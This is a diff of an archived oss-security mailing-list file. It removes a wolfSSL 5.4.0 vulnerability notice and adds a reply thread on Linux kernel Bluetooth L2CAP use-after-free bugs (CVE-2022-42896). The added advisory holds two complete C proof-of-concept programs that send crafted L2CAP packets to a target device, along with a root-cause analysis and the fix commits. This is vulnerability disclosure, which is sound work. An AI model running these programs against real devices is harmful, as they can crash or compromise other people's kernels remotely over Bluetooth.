@@ -1,67 +1,545 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2022/08/08/6
-Message-ID: <20220808162841.32d49ab9@fabiankeil.de>
-Date: Mon, 8 Aug 2022 16:28:41 +0200
-From: Fabian Keil <freebsd-listen@...iankeil.de>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2022/12/15/4
+Message-ID: <Y5uFM+cfCRapuBqA@gentoo.org>
+Date: Thu, 15 Dec 2022 14:36:03 -0600
+From: John Helmert III <ajak@...too.org>
 To: oss-security@...ts.openwall.com
-Subject: wolfSSL 5.4.0 fixes CVE-2022-34293 and other issues
+Cc: carnil@...ian.org
+Subject: Re: Linux Kernel: UAF in Bluetooth L2CAP Handshake
 Content-Type: text/plain; charset=utf-8
 
-Looks like wolfSSL 5.4.0 has been released weeks ago but I only
-became aware of it today thanks to the FreeBSD ports commit mail [0].
+On Thu, Dec 15, 2022 at 03:23:29PM -0500, Rafael Correa De Ysasi wrote:
+> That's correct, that's part of our advisory.
 
-According to the package status on the GitHub page [1] others projects
-haven't imported the update yet either.
+Please include CVEs in reports to oss-security when they are assigned.
 
-Quoting the project page:
-| The wolfSSL embedded SSL library (formerly CyaSSL) is a lightweight
-| SSL/TLS library written in ANSI C and targeted for embedded, RTOS,
-| and resource-constrained environments - primarily because of its
-| small size, speed, and feature set. It is commonly used in standard
-| operating environments as well because of its royalty-free pricing
-| and excellent cross platform support.
+> Thanks,
+> 
+> Rafael
+> 
+> On Wed, Dec 14, 2022 at 4:06 PM Salvatore Bonaccorso <carnil@...ian.org>
+> wrote:
+> 
+> > Hi,
+> >
+> > On Wed, Dec 14, 2022 at 01:13:21PM -0500, Rafael Correa De Ysasi wrote:
+> > > Summary
+> > >
+> > > There are use-after-free vulnerabilities in the Linux kernel's
+> > > net/bluetooth/l2cap_core.c's l2cap_connect and l2cap_le_connect_req
+> > functions
+> > > which may allow code execution and leaking kernel memory (respectively)
+> > > remotely via Bluetooth.
+> > >
+> > > The l2cap_le_connect_req bug was introduced in commit 27e2d4c
+> > > <
+> > https://github.com/torvalds/linux/commit/27e2d4c8d28be1d1b4ecfbffab572d7dbd35254d
+> > >
+> > > (version:
+> > > 3.12.0, date: 2013-Dec-05), the SMP channel is available since commit
+> > > 70db83c
+> > > <
+> > https://github.com/torvalds/linux/commit/70db83c4bcdc1447bbcb318389561c90d7056b18
+> > >
+> > > (version:
+> > > 3.16.0, date: 2014-Aug-14).
+> > > Severity
+> > >
+> > > Moderate
+> > > Proof of Concept
+> > >
+> > > *UAF read in l2cap_le_connect_req*
+> > >
+> > > *```*
+> > >
+> > > #include <stdlib.h>
+> > > #include <unistd.h>
+> > > #include <sys/socket.h>
+> > > #include <sys/uio.h>
+> > > #include <bluetooth/bluetooth.h>
+> > > #include <bluetooth/l2cap.h>
+> > > #include <bluetooth/hci.h>
+> > > #include <bluetooth/hci_lib.h>
+> > > typedef struct l2cap_le_conn_req {
+> > >         uint16_t     psm;
+> > >         uint16_t     scid;
+> > >         uint16_t     mtu;
+> > >         uint16_t     mps;
+> > >         uint16_t     credits;
+> > > } __attribute__ ((packed)) l2cap_le_conn_req;
+> > > int hci_send_acl_data(int hci_socket, uint16_t hci_handle, void *data,
+> > > uint16_t data_length) {
+> > >   uint8_t type = HCI_ACLDATA_PKT;
+> > >   uint16_t BCflag = 0x0000;
+> > >   uint16_t PBflag = 0x0002;
+> > >   uint16_t flags = ((BCflag << 2) | PBflag) & 0x000F;
+> > >
+> > >   hci_acl_hdr hdr;
+> > >   hdr.handle = htobs(acl_handle_pack(hci_handle, flags));
+> > >   hdr.dlen = data_length;
+> > >
+> > >   struct iovec iv[3];
+> > >
+> > >   iv[0].iov_base = &type;
+> > >   iv[0].iov_len = 1;
+> > >   iv[1].iov_base = &hdr;
+> > >   iv[1].iov_len = HCI_ACL_HDR_SIZE;
+> > >   iv[2].iov_base = data;
+> > >   iv[2].iov_len = data_length;
+> > >
+> > >   return writev(hci_socket, iv, sizeof(iv) / sizeof(struct iovec));
+> > > }
+> > >
+> > > #define L2CAP_CID_LE_SIGNALING  0x0005
+> > > #define L2CAP_LE_CONN_REQ       0x14
+> > > #define L2CAP_CID_SMP           0x0006
+> > > #define L2CAP_CID_SMP_BREDR     0x0007
+> > > int main(int argc, char **argv) {
+> > >   if (argc != 2) {
+> > >     printf("Usage: %s MAC_ADDR\n", argv[0]);
+> > >     return 1;
+> > >   }
+> > >
+> > >   bdaddr_t dst_addr;
+> > >   str2ba(argv[1], &dst_addr);
+> > >
+> > >   printf("[*] Resetting hci0 device...\n");
+> > >   system("sudo hciconfig hci0 down");
+> > >   system("sudo hciconfig hci0 up");
+> > >
+> > >   printf("[*] Opening hci device...\n");
+> > >   struct hci_dev_info di;
+> > >   int hci_device_id = hci_get_route(NULL);
+> > >   int hci_socket = hci_open_dev(hci_device_id);
+> > >   if (hci_devinfo(hci_device_id, &di) < 0) {
+> > >     perror("hci_devinfo");
+> > >     return 1;
+> > >   }
+> > >
+> > >   struct hci_filter flt;
+> > >   hci_filter_clear(&flt);
+> > >   hci_filter_all_ptypes(&flt);
+> > >   hci_filter_all_events(&flt);
+> > >   if (setsockopt(hci_socket, SOL_HCI, HCI_FILTER, &flt, sizeof(flt)) <
+> > 0) {
+> > >     perror("setsockopt(HCI_FILTER)");
+> > >     return 1;
+> > >   }
+> > >
+> > >   int opt = 1;
+> > >   if (setsockopt(hci_socket, SOL_HCI, HCI_DATA_DIR, &opt, sizeof(opt)) <
+> > 0) {
+> > >     perror("setsockopt(HCI_DATA_DIR)");
+> > >     return 1;
+> > >   }
+> > >
+> > >   printf("[*] Connecting to victim...\n");
+> > >
+> > >   struct sockaddr_l2 laddr = {0};
+> > >   laddr.l2_family = AF_BLUETOOTH;
+> > >   laddr.l2_bdaddr_type = BDADDR_LE_PUBLIC;
+> > >   laddr.l2_bdaddr = di.bdaddr;
+> > >
+> > >   struct sockaddr_l2 raddr = {0};
+> > >   raddr.l2_family = AF_BLUETOOTH;
+> > >   raddr.l2_bdaddr_type = BDADDR_LE_PUBLIC;
+> > >   raddr.l2_bdaddr = dst_addr;
+> > >
+> > >   int l2_sock;
+> > >   printf("[*] socket\n");
+> > >   if ((l2_sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) {
+> > >     perror("socket");
+> > >     return 1;
+> > >   }
+> > >
+> > >   printf("[*] bind\n");
+> > >   if (bind(l2_sock, (struct sockaddr *)&laddr, sizeof(laddr)) < 0) {
+> > >     perror("bind");
+> > >     return 1;
+> > >   }
+> > >
+> > >   printf("[*] connect\n");
+> > >   if (connect(l2_sock, (struct sockaddr *)&raddr, sizeof(raddr)) < 0) {
+> > >     perror("connect");
+> > >     return 1;
+> > >   }
+> > >
+> > >   printf("[*] getsockopt\n");
+> > >   struct l2cap_conninfo l2_conninfo;
+> > >   socklen_t l2_conninfolen = sizeof(l2_conninfo);
+> > >   if (getsockopt(l2_sock, SOL_L2CAP, L2CAP_CONNINFO, &l2_conninfo,
+> > > &l2_conninfolen) < 0) {
+> > >     perror("getsockopt");
+> > >     return 1;
+> > >   }
+> > >
+> > >   uint16_t hci_handle = l2_conninfo.hci_handle;
+> > >   printf("[+] HCI handle: %x\n", hci_handle);
+> > >
+> > >   struct {
+> > >     l2cap_hdr hdr;
+> > >     l2cap_cmd_hdr cmd_hdr;
+> > >     l2cap_le_conn_req req;
+> > >   } packet = {0};
+> > >   packet.hdr.len = htobs(sizeof(packet) - L2CAP_HDR_SIZE);
+> > >   packet.hdr.cid = htobs(L2CAP_CID_LE_SIGNALING);
+> > >   packet.cmd_hdr.code = L2CAP_LE_CONN_REQ;
+> > >   packet.cmd_hdr.ident = 0x1;
+> > >   packet.cmd_hdr.len = sizeof(packet.req);
+> > >   packet.req.psm = htobs(0);
+> > >   packet.req.scid = htobs(0x42);
+> > >   packet.req.mtu = htobs(23);
+> > >   packet.req.mps = htobs(23);
+> > >   packet.req.credits = htobs(0xff);
+> > >
+> > >   printf("[*] Sending malicious L2CAP packet...\n");
+> > >   hci_send_acl_data(hci_socket, hci_handle, &packet, sizeof(packet));
+> > >
+> > >   close(l2_sock);
+> > >   hci_close_dev(hci_socket);
+> > >
+> > >   return 0;
+> > > }
+> > >
+> > > ```
+> > >
+> > > *UAF write in l2cap_connect*
+> > >
+> > > *```*
+> > >
+> > > #include <stdlib.h>
+> > > #include <unistd.h>
+> > > #include <sys/socket.h>
+> > > #include <sys/uio.h>
+> > > #include <bluetooth/bluetooth.h>
+> > > #include <bluetooth/l2cap.h>
+> > > #include <bluetooth/hci.h>
+> > > #include <bluetooth/hci_lib.h>
+> > > int hci_send_acl_data(int hci_socket, uint16_t hci_handle, void *data,
+> > > uint16_t data_length) {
+> > >   uint8_t type = HCI_ACLDATA_PKT;
+> > >   uint16_t BCflag = 0x0000;
+> > >   uint16_t PBflag = 0x0002;
+> > >   uint16_t flags = ((BCflag << 2) | PBflag) & 0x000F;
+> > >
+> > >   hci_acl_hdr hdr;
+> > >   hdr.handle = htobs(acl_handle_pack(hci_handle, flags));
+> > >   hdr.dlen = data_length;
+> > >
+> > >   struct iovec iv[3];
+> > >
+> > >   iv[0].iov_base = &type;
+> > >   iv[0].iov_len = 1;
+> > >   iv[1].iov_base = &hdr;
+> > >   iv[1].iov_len = HCI_ACL_HDR_SIZE;
+> > >   iv[2].iov_base = data;
+> > >   iv[2].iov_len = data_length;
+> > >
+> > >   return writev(hci_socket, iv, sizeof(iv) / sizeof(struct iovec));
+> > > }
+> > >
+> > > #define L2CAP_CID_SIGNALING     0x0001
+> > > #define L2CAP_CONN_REQ          0x02
+> > > #define L2CAP_CID_SMP           0x0006
+> > > #define L2CAP_CID_SMP_BREDR     0x0007
+> > > int main(int argc, char **argv) {
+> > >   if (argc != 2) {
+> > >     printf("Usage: %s MAC_ADDR\n", argv[0]);
+> > >     return 1;
+> > >   }
+> > >
+> > >   bdaddr_t dst_addr;
+> > >   str2ba(argv[1], &dst_addr);
+> > >
+> > >   printf("[*] Resetting hci0 device...\n");
+> > >   system("sudo hciconfig hci0 down");
+> > >   system("sudo hciconfig hci0 up");
+> > >
+> > >   printf("[*] Opening hci device...\n");
+> > >   struct hci_dev_info di;
+> > >   int hci_device_id = hci_get_route(NULL);
+> > >   int hci_socket = hci_open_dev(hci_device_id);
+> > >   if (hci_devinfo(hci_device_id, &di) < 0) {
+> > >     perror("hci_devinfo");
+> > >     return 1;
+> > >   }
+> > >
+> > >   struct hci_filter flt;
+> > >   hci_filter_clear(&flt);
+> > >   hci_filter_all_ptypes(&flt);
+> > >   hci_filter_all_events(&flt);
+> > >   if (setsockopt(hci_socket, SOL_HCI, HCI_FILTER, &flt, sizeof(flt)) <
+> > 0) {
+> > >     perror("setsockopt(HCI_FILTER)");
+> > >     return 1;
+> > >   }
+> > >
+> > >   int opt = 1;
+> > >   if (setsockopt(hci_socket, SOL_HCI, HCI_DATA_DIR, &opt, sizeof(opt)) <
+> > 0) {
+> > >     perror("setsockopt(HCI_DATA_DIR)");
+> > >     return 1;
+> > >   }
+> > >
+> > >   printf("[*] Connecting to victim...\n");
+> > >
+> > >   struct sockaddr_l2 laddr = {0};
+> > >   laddr.l2_family = AF_BLUETOOTH;
+> > >   laddr.l2_bdaddr_type = BDADDR_BREDR;
+> > >   laddr.l2_bdaddr = di.bdaddr;
+> > >
+> > >   struct sockaddr_l2 raddr = {0};
+> > >   raddr.l2_family = AF_BLUETOOTH;
+> > >   raddr.l2_bdaddr_type = BDADDR_BREDR;
+> > >   raddr.l2_bdaddr = dst_addr;
+> > >
+> > >   int l2_sock;
+> > >   printf("[*] socket\n");
+> > >   if ((l2_sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) {
+> > >     perror("socket");
+> > >     return 1;
+> > >   }
+> > >
+> > >   printf("[*] bind\n");
+> > >   if (bind(l2_sock, (struct sockaddr *)&laddr, sizeof(laddr)) < 0) {
+> > >     perror("bind");
+> > >     return 1;
+> > >   }
+> > >
+> > >   printf("[*] connect\n");
+> > >   if (connect(l2_sock, (struct sockaddr *)&raddr, sizeof(raddr)) < 0) {
+> > >     perror("connect");
+> > >     return 1;
+> > >   }
+> > >
+> > >   printf("[*] getsockopt\n");
+> > >   struct l2cap_conninfo l2_conninfo;
+> > >   socklen_t l2_conninfolen = sizeof(l2_conninfo);
+> > >   if (getsockopt(l2_sock, SOL_L2CAP, L2CAP_CONNINFO, &l2_conninfo,
+> > > &l2_conninfolen) < 0) {
+> > >     perror("getsockopt");
+> > >     return 1;
+> > >   }
+> > >
+> > >   uint16_t hci_handle = l2_conninfo.hci_handle;
+> > >   printf("[+] HCI handle: %x\n", hci_handle);
+> > >
+> > >   struct {
+> > >     l2cap_hdr hdr;
+> > >     l2cap_cmd_hdr cmd_hdr;
+> > >     l2cap_conn_req req;
+> > >   } packet = {0};
+> > >   packet.hdr.len = htobs(sizeof(packet) - L2CAP_HDR_SIZE);
+> > >   packet.hdr.cid = htobs(L2CAP_CID_SIGNALING);
+> > >   packet.cmd_hdr.code = L2CAP_CONN_REQ;
+> > >   packet.cmd_hdr.ident = 0x1;
+> > >   packet.cmd_hdr.len = sizeof(packet.req);
+> > >   packet.req.psm = htobs(0);
+> > >   packet.req.scid = htobs(0x42);
+> > >
+> > >   printf("[*] Sending malicious L2CAP packet...\n");
+> > >   hci_send_acl_data(hci_socket, hci_handle, &packet, sizeof(packet));
+> > >
+> > >   close(l2_sock);
+> > >   hci_close_dev(hci_socket);
+> > >
+> > >   return 0;
+> > > }
+> > >
+> > > ```
+> > >
+> > > To make SMP available for BR/EDR devices (in case of a hardware
+> > supporting
+> > > it is not available), you can force it by running: echo Y >
+> > > /sys/kernel/debug/bluetooth/hci0/force_bredr_smp
+> > > Further Analysis
+> > >
+> > > *Bug Analysis*
+> > > There are UAF races in l2cap_connect
+> > > <
+> > https://github.com/torvalds/linux/blob/2bca25eaeba6190efbfcb38ed169bd7ee43b5aaf/net/bluetooth/l2cap_core.c#L4113
+> > >
+> > >  and l2cap_le_connect_req
+> > > <
+> > https://github.com/torvalds/linux/blob/2bca25eaeba6190efbfcb38ed169bd7ee43b5aaf/net/bluetooth/l2cap_core.c#L5789
+> > >
+> > > methods.
+> > > After a channel is created via the new_connection callback, it is not
+> > > locked but __set_chan_timer sets up a timer which can call
+> > > l2cap_chan_timeout and can cleanup the channel before the method
+> > finishes,
+> > > causing UAF read in l2cap_le_connect_req
+> > > <
+> > https://github.com/torvalds/linux/blob/2bca25eaeba6190efbfcb38ed169bd7ee43b5aaf/net/bluetooth/l2cap_core.c#L5899
+> > >
+> > >  and UAF write in l2cap_connect
+> > > <
+> > https://github.com/torvalds/linux/blob/2bca25eaeba6190efbfcb38ed169bd7ee43b5aaf/net/bluetooth/l2cap_core.c#L4247
+> > >
+> > > .
+> > >
+> > > As the channel timeout is normally 40 seconds
+> > > <
+> > https://github.com/torvalds/linux/blob/2bca25eaeba6190efbfcb38ed169bd7ee43b5aaf/include/net/bluetooth/l2cap.h#L55
+> > >
+> > >  (L2CAP_CONN_TIMEOUT), winning the race would be infeasible, but due to a
+> > > bug in SMP's implementation, SMP channels created by smp_new_conn_cb
+> > > <
+> > https://github.com/torvalds/linux/blob/2bca25eaeba6190efbfcb38ed169bd7ee43b5aaf/net/bluetooth/smp.c#L3241
+> > >
+> > > have
+> > > their get_sndtimeo callback set to l2cap_chan_no_get_sndtimeo which
+> > returns
+> > > 0
+> > > <
+> > https://github.com/torvalds/linux/blob/2bca25eaeba6190efbfcb38ed169bd7ee43b5aaf/include/net/bluetooth/l2cap.h#L964
+> > >
+> > > as
+> > > timeout value thus causing the timer to run immediately (on a different
+> > > thread) after the __set_chan_timer call.
+> > >
+> > > Note: in l2cap_le_connect_req (without FLAG_DEFER_SETUP), the timer is
+> > > canceled via the l2cap_chan_ready call almost immediately after the
+> > > __set_chan_timer call, but even this small time window enough for the
+> > timer
+> > > with 0 timeout to start.
+> > >
+> > > Another root cause of the issue can be that the SMP channel is available
+> > > via l2cap_global_chan_by_psm if the request contains psm=0. Multiple
+> > > channels can be registered without PSM (PSM is 0, and channel is
+> > identified
+> > > by SCID) but only one of them is returned (which needs to be SMP to be
+> > able
+> > > to trigger the vulnerability).
+> > >
+> > > ```
+> > >
+> > > static int l2cap_le_connect_req(...)
+> > > {
+> > >     ...
+> > >     mutex_lock(&conn->chan_lock);
+> > >     ...
+> > >     chan = pchan->ops->new_connection(pchan); // chan is not locked
+> > >     ...
+> > >     __set_chan_timer(chan, chan->ops->get_sndtimeo(chan)); // triggers
+> > > l2cap_chan_timeout running from a different thread
+> > >     ...
+> > >     if (test_bit(FLAG_DEFER_SETUP, &chan->flags)) { // branch usually
+> > not taken
+> > >         ...
+> > >     } else {
+> > >         l2cap_chan_ready(chan); // calls __clear_chan_timer(chan),
+> > resets timer
+> > >         result = L2CAP_CR_LE_SUCCESS;
+> > >     }
+> > >     ...
+> > >     mutex_unlock(&conn->chan_lock); // l2cap_chan_timeout is blocked
+> > > until this call
+> > >     ...
+> > >     if (chan) { // [7] UAF read
+> > >         rsp.mtu = cpu_to_le16(chan->imtu);
+> > >         rsp.mps = cpu_to_le16(chan->mps);
+> > >     } else {
+> > >     ...
+> > > }
+> > >
+> > > ```
+> > >
+> > > Similar issue within l2cap_connect:
+> > >
+> > > ```
+> > >
+> > > static struct l2cap_chan *l2cap_connect(...)
+> > > {
+> > >     ...
+> > >     mutex_lock(&conn->chan_lock);
+> > >     ...
+> > >     chan = pchan->ops->new_connection(pchan); // chan is not locked
+> > >     ...
+> > >     __set_chan_timer(chan, chan->ops->get_sndtimeo(chan)); // triggers
+> > > l2cap_chan_timeout running from a different thread
+> > >     ...
+> > >     mutex_unlock(&conn->chan_lock); // l2cap_chan_timeout is blocked
+> > > until this call
+> > >     ...
+> > >     if (chan && !test_bit(CONF_REQ_SENT, &chan->conf_state) && // UAF
+> > read
+> > >         result == L2CAP_CR_SUCCESS) {
+> > >         u8 buf[128];
+> > >         set_bit(CONF_REQ_SENT, &chan->conf_state); // UAF write
+> > >         l2cap_send_cmd(conn, l2cap_get_ident(conn), L2CAP_CONF_REQ,
+> > >                    l2cap_build_conf_req(chan, buf, sizeof(buf)), buf);
+> > >         chan->num_conf_req++;
+> > >     }
+> > >     return chan;
+> > > }
+> > >
+> > > ```
+> > >
+> > > The affected code path in SMP implementation:
+> > >
+> > > ```
+> > >
+> > > static inline struct l2cap_chan *smp_new_conn_cb(struct l2cap_chan
+> > *pchan)
+> > > {
+> > >     …
+> > >     chan->ops = &smp_chan_ops;
+> > >     …
+> > > }
+> > > static const struct l2cap_ops smp_chan_ops = {
+> > >     …
+> > >     .get_sndtimeo = l2cap_chan_no_get_sndtimeo,
+> > >     …
+> > > };
+> > > static inline long l2cap_chan_no_get_sndtimeo(struct l2cap_chan *chan)
+> > > {
+> > >     return 0;
+> > > }
+> > >
+> > > ```
+> > >
+> > > *Reachability*
+> > > SMP channel is available for Bluetooth Low Energy since BT 4.0 (~2009)
+> > > which can be used to trigger the UAF read in l2cap_le_connect_req, and it
+> > > is also available for BT BR/EDR since BT 5.2 (~2020, to support Secure
+> > > Connections) to trigger the UAF write in l2cap_connect.
+> > >
+> > > No other prerequisites were found, the bugs were triggered on a
+> > > KASAN-enabled Ubuntu 22.04 kernel (an artificial delay was added before
+> > the
+> > > UAF read/write to make winning the race easier).
+> > >
+> > > Note: it is possible that the bugs can be triggered via other channels
+> > > which may be created automatically by the specific environment.
+> > > Patch
+> > >
+> > > The vulnerability was fixed by not accepting 0 as a valid PSM value in
+> > > commit 711f8c3
+> > > <
+> > https://github.com/torvalds/linux/commit/711f8c3fb3db61897080468586b970c87c61d9e4
+> > >
+> > > and
+> > > by preventing l2cap_global_chan_by_psm to give back L2CAP_CHAN_FIXED
+> > channels
+> > > in commit f937b75
+> > > <
+> > https://github.com/torvalds/linux/commit/f937b758a188d6fd328a81367087eddbb2fce50f
+> > >
+> > > .
+> > > Timeline
+> > >
+> > > *Date reported*: 10/06/2022
+> > > *Date fixed*: 10/26/2022
+> > > *Date disclosed*: 11/28/2022
+> >
+> > According to
+> >
+> > https://github.com/google/security-research/security/advisories/GHSA-pf87-6c9q-jvm4
+> > this should have CVE-2022-42896 assigned.
+> >
+> > Regards,
+> > Salvatore
+> >
 
-Quoting the commit message:
-| Release 5.4.0 of wolfSSL embedded TLS has bug fixes and new features including:
-|
-| Vulnerabilities
-|
-| * [High] Potential for DTLS DoS attack. In wolfSSL versions before 5.4.0 the
-|   return-routability check is wrongly skipped in a specific edge case. The check
-|   on the return-routability is there for stopping attacks that either consume
-|   excessive resources on the server, or try to use the server as an amplifier
-|   sending an excessive amount of messages to a victim IP. If using DTLS 1.0/1.2
-|   on the server side users should update to avoid the potential DoS
-|   attack. CVE-2022-34293
-| * [Medium] Ciphertext side channel attack on ECC and DH operations. Users on
-|   systems where rogue agents can monitor memory use should update the version of
-|   wolfSSL and change private ECC keys. Thanks to Sen Deng from Southern
-|   University of Science and Technology (SUSTech) for the report.
-| * [Medium] Public disclosure of a side channel vulnerability that has been fixed
-|   since wolfSSL version 5.1.0. When running on AMD there is the potential to
-|   leak private key information with ECDSA operations due to a ciphertext side
-|   channel attack. Users on AMD doing ECDSA operations with wolfSSL versions less
-|   than 5.1.0 should update their wolfSSL version used. Thanks to professor
-|   Yinqian Zhang from Southern University of Science and Technology (SUSTech),
-|   his Ph.D. student Mengyuan Li from The Ohio State University, and his M.S
-|   students Sen Deng and Yining Tang from SUStech along with other collaborators;
-|   Luca Wilke, Jan Wichelmann and Professor Thomas Eisenbarth from the University
-|   of Lubeck, Professor Shuai Wang from Hong Kong University of Science and
-|   Technology, Professor Radu Teodorescu from The Ohio State University, Huibo
-|   Wang, Kang Li and Yueqiang Cheng from Baidu Security and Shoumeng Yang from
-|   Ant Financial Services Group.
-| CVE-2020-12966
-| https://www.amd.com/en/corporate/product-security/bulletin/amd-sb-1013
-| CVE-2021-46744
-| https://www.amd.com/en/corporate/product-security/bulletin/amd-sb-1033
-
-In somewhat related news I started collecting Privoxy TLS benchmarks using
-various TLS libraries a while ago ([3]). WolfSSL appears to be competitive.
-
-Fabian
-
-[0] <https://cgit.freebsd.org/ports/commit/?id=4850ea1e3ca82f63f94654cf1b9790ec476bbb18>
-[1] <https://github.com/wolfSSL/wolfssl/>
-[2] <https://www.fabiankeil.de/gehacktes/privoxy-tls-benchmarks/>
-
-Content of type "application/pgp-signature" skipped
+Download attachment "signature.asc" of type "application/pgp-signature" (229 bytes)
